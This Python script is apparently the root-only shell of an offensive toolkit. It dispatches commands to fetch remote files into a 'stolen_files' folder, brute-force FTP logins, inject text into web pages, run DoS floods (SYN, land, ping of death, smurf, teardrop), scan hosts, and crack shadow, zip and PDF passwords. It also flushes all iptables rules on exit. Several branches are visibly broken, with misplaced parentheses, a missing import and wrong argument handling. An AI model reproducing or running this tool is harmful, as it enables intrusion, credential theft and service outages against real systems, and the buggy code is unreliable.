#!/usr/bin/python3
from options import *
from isvalid import *
from denial_of_service import *
from password_file_cracker import *
from probe import *
from os import geteuid, popen, getcwd, mkdir
from os.path import exists, isfile
import subprocess
import sys
from extra import *


def parse_args(args):
    try:
        if args[0] == "GET":
            if len(args) == 3:
                if valid_ip(args[1]):
                    reply = get(args[1], args[2])
                    # reply = tcp_handshake(args[1], args[2])
                    with open("results.txt", "a+") as file:
                        if reply is None:
                            file.write("GET,FAILED," + args[1] + "," + args[2] + "\n")
                        else:
                            file.write("GET,PASSED," + args[1] + "," + args[2] + "\n")
                            if not exists(getcwd() + "/stolen_files"):
                                mkdir(getcwd()+"/stolen_files")
                            p = Path(args[2])
                            with open("./stolen_files/"+p.name, "w") as stolen:
                                stolen.write(reply)

                else:
                    print("Bad Input! Malformed IP Address!")
            else:
                print("Bad Input! Invalid Number of Arguments!")
                return

        elif args[0] == "password_crack":
            parse_password_crack(args)

        elif args[0] == "ftp":
            if len(args) == 2 and valid_ip(args[1]):
                brute_login(args[1])
            elif len(args) == 3 and valid_ip(args[1]) and exists(args[2]) and isfile(args[2]):
                brute_login(args[1], args[2])
            else:
                print("usage: ftp <hostname> <username:password file>")

        elif args[0] == "inject":
            if len(args) == 2 and valid_ip(args[1]):
                inject_page(args[1])
            elif len(args) == 3 and valid_ip(args[1]):
                inject_page(args[1], args[2])
            elif len(args) == 4 and valid_ip(args[1]):
                inject_page(args[1], args[2], args[3])
            else:
                print("usage: inject <IP Address> <File to Inject> <Text to inject>")

        elif args[0] == "dos":
            parse_dos(args)

        elif args[0] == "probe":
            parse_probe()

    except IndexError:
        print(args)
        print("Index out of bounds!")
        return

    except KeyboardInterrupt:
        return

    except TimeoutError as t:
        print(t)
        return

    except ValueError:
        print("Invalid! Seconds can only be integer arguments!")
        return

    except Exception as e:
        print(e)
        return


# This contains all stuff to execute DOS attacks
def parse_dos(args):
    try:
        if args[1] == "syn":
            if valid_ip(args[2]) and valid_port(args[3], dos=True):
                syn_flood(args[2], args[3])
            else:
                print("usage: dos syn <Target IP> <Port Number>")

        # Technically this is more application layer kind of attack...
        elif args[1] == "back" and valid_ip(args[2]):
            back(args[2], payload="../index.html")

        elif args[1] == "land" and valid_ip(args[2]) and valid_port(args[3], dos=True):
            land(args[2], args[3])

        elif args[1] == "pod" and valid_ip(args[2]):
            pod(args[2])

        elif args[1] == "smurf" and valid_ip(args[2]):
            smurf(args[2], args[2])

        elif args[1] == "teardrop" and valid_ip(args[2]) and (args[3] == '0' or args[3] == '1' or args[3] == '2' or args[3] == '3' or args[3] == '4'):
            teardrop(args[2], args[3])

    except IndexError:
        print("Index out of bounds!")
        return


def parse_probe(args):

    try:
        if args[1] == "ping":
            ping(ping_target=args[2], time_out=5)

        elif args[1] == "host_scan" and valid_ip(args[2]):
            # Return a Dictionary of <IP Address, Open Port>
            host_scan(args[2], min_port=1024, max_port=65535, time_out=2)

        # If all else fails there is always UDP Ping which will produce ICMP Port unreachable errors
        # from live hosts. Here you can pick any port which is most likely to be closed,
        # such as port 0:
        elif args[1] == "udp_ping" and valid_ip(args[2]):
            udp_ping(args[2], min_port=0, max_port=65535, time_out=2)

        # TODO: Valid network address to scan?
        elif args[1] == "arp_ping":
            arp_ping(args[2], time_out=2)

    except IndexError:
        print(args)
        print("Index out of bounds: Probe Attacks")


def parse_password_crack(args):
    print("usage: crack-host <shadow-file> <password-file>")
    print("usage: crack-zip <zip-file> <password-file>")
    print("usage: crack-pdf <pdf-file> <password-file>")

    try:
        if args[1] == "crack-host":
            with open("target.txt") as passFile:
                for line in passFile:
                    if ":" in line:
                        user = line.split(':')[0]
                        crypt_pass = line.split(':')[1].strip(' ')
                        print("[*] Cracking Password for user: " + user)
                        if len(args) == 1:
                            crack_local_host(crypt_pass)
                        elif len(args) == 2 and exists(args[1]) and isfile(args[1]):
                            crack_local_host(crypt_pass, args[1])
                        else:
                            return

        elif args[1] == "crack-zip":
            if exists(args[1]) and isfile(args[1]):
                crack_zip_file(args[1])
            if exists(args[1] and isfile(args[1]) and exists(args[2])) and isfile(args[2]):
                    crack_zip_file(args[1], args[2])
            else:
                return

        elif args[1] == "crack-pdf":
            if exists(args[1]) and isfile(args[1]) and valid_extension(args[1], "pdf"):
                crack_pdf_file(args[1])
            if exists(args[1] and isfile(args[1]) and valid_extension(args[1], "pdf")
                      and exists(args[2])) and isfile(args[2]):
                crack_pdf_file(args[1], args[2])

    except IndexError:
        print("Index out of bounds in Parse Password Crack")
        print(args)


def main():

    if geteuid() != 0:
        exit("Please try again, this time using 'sudo'. Exiting.")

    try:
        input("Beware! This program will assume you have nothing on your IP Tables! "
              "If you don't want this press CTRL-D NOW!\n")
    except EOFError:
        exit("Exiting Program early because permission denied to update IP Tables")

    # For TCP Handshake to work correctly, I need to modify IP Tables
    # sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <SOURCE IP> -j DROP
    source_ip = popen("hostname -I").read()
    update_table = ["sudo", "iptables", "-A", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-s",
                    source_ip.rstrip(), "-j", "DROP"]
    subprocess.call(update_table)

    # An option supported by this is to read a text file and execute all commands as if it were fed on the shell
    if len(sys.argv) == 2 and exists(sys.argv[1]) and isfile(sys.argv[1]):
        # Remember that sys.argv[0] is fuzzer.py
        with open(sys.argv[1], "r") as file:
            for line in file:
                args = line.split()
                # parse_args(args)
                parse_dos(args)

    while True:
        try:
            var = input("Shell> ")
            args = var.split()

            if len(args) == 1 and args[0] == "exit":
                break
            if len(args) >= 1 and args[0] == "dos":
                parse_dos(args)
            # This also takes case of when no arguments are inputted as well!
            else:
                parse_args(args)

        except EOFError:
            print("EOF detected --closing--")
            break

        except KeyboardInterrupt:
            print("Interrupt detected --closing--")
            break

    # Revert changes to IP Table!
    subprocess.call(["sudo", "iptables", "-F"])


if __name__ == '__main__':
    main()
